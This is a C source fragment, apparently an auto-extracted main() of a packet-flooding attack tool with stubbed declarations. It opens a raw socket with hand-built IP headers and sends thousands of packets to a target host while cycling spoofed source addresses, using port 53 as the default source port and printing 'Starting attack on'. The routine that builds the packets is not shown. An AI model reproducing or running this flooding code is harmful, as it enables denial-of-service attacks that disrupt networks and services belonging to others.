
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int time_t ;
typedef int on ;


 int AF_INET ;
 int IPPROTO_IP ;
 int IPPROTO_RAW ;
 int IP_HDRINCL ;
 int SOCK_RAW ;
 void* atoi (int ) ;
 int exit (int) ;
 int fflush (int ) ;
 int fprintf (int ,char*,...) ;
 int getopt (int,char**,char*) ;
 int getpid () ;
 scalar_t__ htonl (int) ;
 int optarg ;
 scalar_t__ optind ;
 int perror (char*) ;
 unsigned long resolve (char*) ;
 int sendem (int,scalar_t__,unsigned long,unsigned short,unsigned short) ;
 scalar_t__ setsockopt (int,int ,int ,char*,int) ;
 int socket (int ,int ,int ) ;
 int srandom (int) ;
 int stdout ;
 int time (int ) ;
 int usage () ;
 int usleep (int) ;

int main(int argc, char **argv)
{
 int sock;
 int on=1,i;
 unsigned long source, dest;
 unsigned short sport=53, dport=16384;
 int delay=20000, count=15000;

 if (argc<3)
  usage();

 while ((i=getopt(argc,argv,"s:d:n:u:"))!=-1)
 {
  switch (i)
  {
   case 's': sport=atoi(optarg);
      break;
   case 'd': dport=atoi(optarg);
      break;
   case 'n': count=atoi(optarg);
      break;
   case 'u': delay=atoi(optarg);
      break;
   default: usage();
  }
 }

 argc-=optind;
 argv+=optind;

 source=resolve(argv[0]);
        dest=resolve(argv[1]);

 srandom(time((time_t)0)*getpid());

 if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
 {
  perror("socket");
  exit(1);
 }

 if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0)
 {
  perror("setsockopt: IP_HDRINCL");
  exit(1);
 }

 fprintf(stdout,"\nStarting attack on %s ...",argv[1]);

 for (i=0; i<count; i++)
 {
  sendem(sock,source+htonl(i),dest,sport,dport);
  if (!(i%2))
   usleep(delay);
  if (!(i%100))
  {
   if (!(i%2000))
    fprintf(stdout,"\n");
   fprintf(stdout,".");
   fflush(stdout);
  }
 }

 fprintf(stdout,"\nDone.\n");
 exit(1);
}
